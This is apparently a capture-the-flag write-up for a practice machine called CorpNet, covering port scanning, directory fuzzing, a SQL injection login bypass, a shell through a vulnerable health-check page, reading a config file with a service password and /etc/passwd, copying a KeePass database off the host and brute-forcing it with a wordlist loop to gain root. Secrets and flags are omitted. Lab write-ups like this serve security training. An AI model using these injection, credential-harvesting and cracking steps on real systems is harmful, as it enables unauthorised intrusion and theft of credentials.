## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Enumerate a running internal service, exploit a vulnerable web application, pivot through the system, and crack your way to root.
## Green Lights, Dark Corners

CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.
```
---
#### IP
```IP
10.49.174.194
```
---
#### Enumeration
- Port Scan
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c5:ed:1a:3e:1d:46:68:0a:ad:6c:65:7b:cd:d2:3b:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFry0fpa6tgojQcJfj5fL+qhMrUTE5xK8nvvO/KoAkTThulvEsSicmEttPFbPp5CcR/EUeBra+vGotgnyStgW4=
|   256 ad:6d:3d:24:b6:60:c5:48:05:98:25:ea:50:ee:e5:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxBuaqRAaJI+ICfg3pwFZjkmdFBQRUjWbV0a+0d3xYq
5050/tcp open  http    syn-ack ttl 62 Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
```
- Web Application Enumeration
```bash
ffuf -u http://corpnet.thm:5050/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-mc 200,204,301,302,307,401,403 \
-fs 3424
internal                Status: 200
```
---
##### Web App Testing
- SQL injection
```bash
' or 1 or '
```
- internal /dashboard 
```bash
/audit logs
/health check
```
- vulnerable section - `health-check`
- Shell Claimed
```bash
www-data@tryhackme-2204:/opt/netops$ whoami
www-data
www-data@tryhackme-2204:/opt/netops$ ls
app.py	netops.db  secret.config  templates
www-data@tryhackme-2204:/opt/netops$ cat secret.config
# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = [password omitted]

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal

www-data@tryhackme-2204:/opt/netops$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1001:1001::/home/sysadmin:/bin/bash
```
- Creds Found
```bash
run_as   = sysadmin
password = [password omitted]
```
---
#### SSH
```bash
sysadmin@tryhackme-2204:~$ ls
backups  user.txt
sysadmin@tryhackme-2204:~$ cat user.txt
[flag omitted]
sysadmin@tryhackme-2204:~$ sudo -l
[sudo] password for sysadmin:
Sorry, user sysadmin may not run sudo on tryhackme-2204.
```
----
#### Privilege Escalation
- User Enumeration
```bash
sysadmin@tryhackme-2204:~$ ls
backups  user.txt
sysadmin@tryhackme-2204:~$ cd backups/
sysadmin@tryhackme-2204:~/backups$ ls
README.txt  infrastructure.kdbx
sysadmin@tryhackme-2204:~/backups$ cat README.txt
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
sysadmin@tryhackme-2204:~/backups$ cat infrastructure.kdbx
```
- Inside `Backup` - infrastructure might contain Password
- Transfer to own attacker machine
```bash
scp sysadmin@10.49.174.194:/home/sysadmin/backups/infrastructure.kdbx .
```
- Download tool `keepassxc` - for extension - #KDBX
```bash
 keepassxc-cli --version
2.7.10

┌──(kali㉿kali)-[~]
└─$ while read -r pass; do
    printf '%s\n' "$pass" | keepassxc-cli open infrastructure.kdbx >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Password: $pass"
        break
    fi
done < /usr/share/wordlists/rockyou.txt
[+] Password: [password omitted]
```
- Used Loop To crack Password
```bash
keepassxc infrastructure.kdbx
password : [password omitted]
```
- Inside the File `Root` Credentials revealed
```creds
username - root
Password - [password omitted]
```
- Root User
```bash
sysadmin@tryhackme-2204:~/backups$ su root
Password:
root@tryhackme-2204:/home/sysadmin/backups# cd
root@tryhackme-2204:~# ls
root.txt  snap
root@tryhackme-2204:~# cat root.txt
[flag omitted]
```
# END